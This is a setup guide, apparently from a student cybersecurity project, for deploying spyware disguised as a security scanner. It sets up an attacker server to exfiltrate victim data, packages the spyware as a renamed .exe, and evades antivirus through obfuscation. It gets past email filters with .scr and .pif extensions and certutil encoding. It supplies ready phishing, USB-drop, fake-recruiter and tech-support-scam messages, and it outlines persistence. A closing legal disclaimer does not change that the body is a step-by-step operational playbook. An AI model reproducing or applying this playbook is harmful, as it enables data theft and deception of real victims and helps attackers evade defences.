# SETUP GUIDE - DATA EXFILTRATION & DELIVERY
**Complete guide to enable real data exfiltration and delivery methods**

---

## 🎯 PART 1: SETTING UP DATA EXFILTRATION

### **Problem:**
Currently, collected data is only saved locally on victim machine. To send data to attacker's machine (real exfiltration), you need to set up an attacker server.

### **Solution:**

#### **Step 1: Install Required Library**

On BOTH machines (attacker and victim):

```powershell
pip install flask requests
```

#### **Step 2: Set Up Attacker Server**

**On Attacker Machine (Windows/Linux):**

1. Navigate to malicious_code folder:
```powershell
cd "c:\Users\TUF\Documents\Cyber\cybersecurity_final_project-master\malicious_code"
```

2. Run the attacker server:
```powershell
python attacker_server.py
```

3. **Important:** Note the IP address shown, example:
```
✓ Server running at: http://192.168.1.100:5000

📝 SETUP INSTRUCTIONS:
   1. Update config.py with this URL:
      ATTACKER_URL = "http://192.168.1.100:5000/receive"
```

4. Keep this server running - it will receive victim data

#### **Step 3: Configure Spyware**

**On Attacker Machine (before deploying to victim):**

1. Open `config.py` in the malicious_code folder

2. Update these settings:
```python
# Change this to your attacker server IP (from Step 2)
ATTACKER_URL = "http://192.168.1.100:5000/receive"  # ⚠️ USE YOUR IP!

# Enable real exfiltration
USE_REAL_EXFILTRATION = True  # Change False to True
```

3. Save the file

#### **Step 4: Test Exfiltration**

**On Victim Machine (can be another VM):**

1. Make sure victim machine can reach attacker (test ping):
```powershell
ping 192.168.1.100
```

2. Run the spyware:
```powershell
python spyware_main.py
```

3. Click "Start Security Scan"

4. **Check Attacker Server** - you should see:
```
✓ DATA RECEIVED FROM VICTIM!
======================================================================
Timestamp: 2024-12-11 15:30:45
Hostname: VICTIM-PC
Saved to: received_victim_data/victim_VICTIM-PC_20241211_153045.json
Data size: 2847 bytes

Victim Info:
  - Username: JohnDoe
  - OS: Windows 10
  - IP: 192.168.1.105
  - Email: victim@email.com
```

5. Data is saved to: `received_victim_data/` folder on attacker machine

---

## 📦 PART 2: DELIVERY TO VICTIMS

### **Problem:**
Python scripts can't be sent directly to victims. You need to convert to `.exe` file.

### **Solution: Convert to Executable**

#### **Option A: Using Build Script (Easiest)**

```powershell
# Navigate to malicious_code folder
cd "c:\Users\TUF\Documents\Cyber\cybersecurity_final_project-master\malicious_code"

# Run the build script
python build_executable.py
```

**Output:**
- Creates: `dist\SecurityScanner.exe`
- Ready to deliver to victims!

#### **Option B: Manual PyInstaller**

```powershell
# Install PyInstaller
pip install pyinstaller

# Build executable
pyinstaller --onefile --windowed --name="SecurityScanner" spyware_main.py

# Output: dist\SecurityScanner.exe
```

#### **Option C: With Custom Icon (More Professional)**

1. Download a security shield icon as `security_icon.ico`
2. Place in malicious_code folder
3. Build:
```powershell
pyinstaller --onefile --windowed --icon=security_icon.ico --name="SecurityScanner" spyware_main.py
```

---

## 📧 PART 3: DELIVERY METHODS

### **Method 1: Email (Phishing)**

#### **Step 1: Prepare Executable**

```powershell
# Rename to look legitimate
cd dist
Rename-Item "SecurityScanner.exe" "WindowsSecurityUpdate.exe"
```

#### **Step 2: Create Email**

**Email Template:**
```
Subject: URGENT: Critical Security Vulnerability - Action Required

Dear User,

Our security team has identified a critical vulnerability affecting your system.
Please run the attached Windows Security Update immediately.

File: WindowsSecurityUpdate.exe

Instructions:
1. Download the attachment
2. Right-click → Run as Administrator
3. Complete the security scan

This update is mandatory and must be completed by EOD.

IT Security Team
```

#### **Step 3: Send Email**
- Use your email client (Gmail, Outlook, etc.)
- Attach the renamed .exe file
- Send to victim

**Note:** Many email providers block .exe files. Solutions:
- Compress to ZIP: `Compress-Archive -Path WindowsSecurityUpdate.exe -DestinationPath SecurityUpdate.zip`
- Use file-sharing link instead
- Use .scr extension (screensaver): `Rename-Item *.exe *.scr`

---

### **Method 2: USB Drive**

#### **Step 1: Prepare USB**

```powershell
# Copy executable to USB
Copy-Item "dist\SecurityScanner.exe" "E:\SecurityScanner.exe"

# Create convincing README
@"
CONFIDENTIAL - IT DEPARTMENT

This USB contains the mandatory security assessment tool.

TO COMPLY:
1. Run SecurityScanner.exe
2. Complete the scan
3. Return this USB to IT

Deadline: End of Week
"@ | Out-File "E:\README.txt"
```

#### **Step 2: Rename USB Drive**
- Right-click USB → Rename
- Name it: "IT Security Tools" or "Salary_2024_Confidential"

#### **Step 3: Physical Delivery**
- Leave in parking lot, office, coffee shop
- Mail to target
- Hand deliver claiming it's from IT

---

### **Method 3: File Sharing / Download Link**

#### **Step 1: Upload to File Sharing**

Upload `SecurityScanner.exe` to:
- Google Drive (share link)
- Dropbox (public link)
- WeTransfer
- MediaFire
- MEGA.nz

#### **Step 2: Shorten URL**

Use bit.ly or tinyurl.com to make link less suspicious:
```
Original: https://drive.google.com/file/d/abc123def456/view?usp=sharing
Shortened: https://bit.ly/security-scan
```

#### **Step 3: Send Link**

**Via Email:**
```
Subject: Mandatory Security Scan

Please download and run our security scanner:
https://bit.ly/security-scan

This is required for all employees by Friday.
```

**Via Social Media:**
```
🔒 Important Security Update 🔒

All users must run this security check:
https://bit.ly/security-scan

Deadline: 48 hours
```

---

### **Method 4: Social Engineering (Advanced)**

#### **LinkedIn Message:**
```
Hi [Name],

I reviewed your LinkedIn profile and am impressed with your background.

We're hiring for a [Job Title] position. As part of the screening process,
please complete this technical assessment:

Download: [link to SecurityScanner.exe]

Looking forward to your response!
```

#### **Tech Support Scam:**
```
WARNING: Security Alert

Your computer has been compromised. Download this security scanner
immediately to remove threats:

[link or attachment]

Call us if you need assistance: 1-800-XXX-XXXX
```

---

## 🧪 PART 4: TESTING COMPLETE FLOW

### **Test Scenario: Two VMs**

**VM 1 (Attacker):**
```powershell
# 1. Start attacker server
cd malicious_code
python attacker_server.py

# Note IP address shown (e.g., 192.168.1.100)
```

**VM 2 (Victim):**
```powershell
# 1. Update config.py with attacker IP
# 2. Build executable
python build_executable.py

# 3. Copy dist\SecurityScanner.exe to desktop
# 4. Double-click to run
# 5. Click "Start Security Scan"
```

**Expected Result:**
- Victim sees fake security scan
- Attacker receives data in real-time
- Data saved to: `received_victim_data/` folder

---

## ⚙️ TROUBLESHOOTING

### **Issue 1: Exfiltration Fails**

**Symptoms:** No data received on attacker server

**Solutions:**
1. Check if attacker server is running
2. Verify firewall allows port 5000:
   ```powershell
   netsh advfirewall firewall add rule name="Attacker Server" dir=in action=allow protocol=TCP localport=5000
   ```
3. Verify IP in config.py matches attacker IP
4. Test connection: `curl http://192.168.1.100:5000/status`
5. Check `USE_REAL_EXFILTRATION = True` in config.py
6. Verify `requests` library installed: `pip install requests`

### **Issue 2: Can't Build Executable**

**Symptoms:** PyInstaller errors

**Solutions:**
1. Install PyInstaller: `pip install pyinstaller`
2. Run as administrator
3. Disable antivirus temporarily (it may block PyInstaller)
4. Clear cache: `pyinstaller --clean`

### **Issue 3: Executable Detected by Antivirus**

**Solutions:**
1. Use PyArmor obfuscation: `pip install pyarmor; pyarmor obfuscate spyware_main.py`
2. Add exe to AV exceptions (testing only)
3. Use different compiler (cx_Freeze, Nuitka)
4. Test on VM without AV first

### **Issue 4: Email Blocks .exe Attachment**

**Solutions:**
1. Compress to ZIP: `Compress-Archive -Path *.exe -DestinationPath tool.zip`
2. Rename extension: `.scr`, `.com`, `.pif`
3. Use file-sharing link instead
4. Split into multiple parts: `certutil -encode file.exe file.txt`

---

## 📊 SUCCESS CHECKLIST

**Exfiltration Setup:**
- [ ] Flask installed on attacker machine: `pip install flask`
- [ ] Requests installed on victim: `pip install requests`
- [ ] Attacker server running: `python attacker_server.py`
- [ ] Attacker IP noted (example: 192.168.1.100)
- [ ] `config.py` updated with correct IP
- [ ] `USE_REAL_EXFILTRATION = True` in config.py
- [ ] Firewall allows port 5000
- [ ] Victim can ping attacker IP

**Executable Build:**
- [ ] PyInstaller installed: `pip install pyinstaller`
- [ ] Executable built: `python build_executable.py`
- [ ] Output exists: `dist\SecurityScanner.exe`
- [ ] Tested on clean VM (runs without errors)
- [ ] File size reasonable (<50 MB)

**Delivery:**
- [ ] Executable renamed to convincing name
- [ ] Delivery method chosen (email/USB/link)
- [ ] Social engineering template prepared
- [ ] Testing completed on controlled VMs

---

## 🎯 COMPLETE ATTACK FLOW

```
1. Attacker prepares spyware:
   - Update config.py with attacker IP
   - Build executable: python build_executable.py
   - Rename: SecurityScanner.exe → WindowsUpdate.exe

2. Attacker starts server:
   - python attacker_server.py
   - Server waits for victim data

3. Attacker delivers spyware:
   - Email attachment with convincing message
   - USB drive left in parking lot
   - Download link via social media

4. Victim executes spyware:
   - Sees professional security scanner GUI
   - Clicks "Start Security Scan"
   - Thinks system is being scanned

5. Spyware operates:
   - Installs to: %APPDATA%\SystemSecurityService
   - Collects: system info, files, apps
   - Sends data to attacker via HTTP POST
   - Creates persistence (startup + registry)

6. Attacker receives data:
   - Real-time notification on server
   - Data saved as JSON file
   - Contains: hostname, username, OS, files, IP, etc.

7. Victim is compromised:
   - Spyware runs on every boot
   - Continues collecting data
   - Victim unaware of infection
```

---

## ⚠️ IMPORTANT REMINDERS

**Legal Warning:**
- ✅ **ONLY** use on your own VMs
- ✅ **ONLY** for educational purposes
- ✅ **NEVER** deploy on real systems without authorization
- ❌ Deploying malware is **ILLEGAL** and punishable by law

**Ethical Guidelines:**
- This is for **learning how attacks work**
- Helps you **defend against** these attacks
- Trains you to **recognize phishing**
- Teaches you **detection techniques**

**Use this knowledge to:**
- 🛡️ Improve security awareness training
- 🛡️ Test antivirus detection
- 🛡️ Develop better defenses
- 🛡️ Educate others about threats

**NEVER use to:**
- ❌ Compromise real systems
- ❌ Steal data
- ❌ Harm others
- ❌ Commit crimes

---

## 📚 ADDITIONAL RESOURCES

**See also:**
- `DELIVERY_METHODS.md` - Detailed delivery techniques
- `README.md` - Project overview
- `PROJECT_README.md` - Complete documentation

**Testing Platforms:**
- VMware Workstation (recommended)
- VirtualBox
- Hyper-V
- Use isolated network or host-only networking
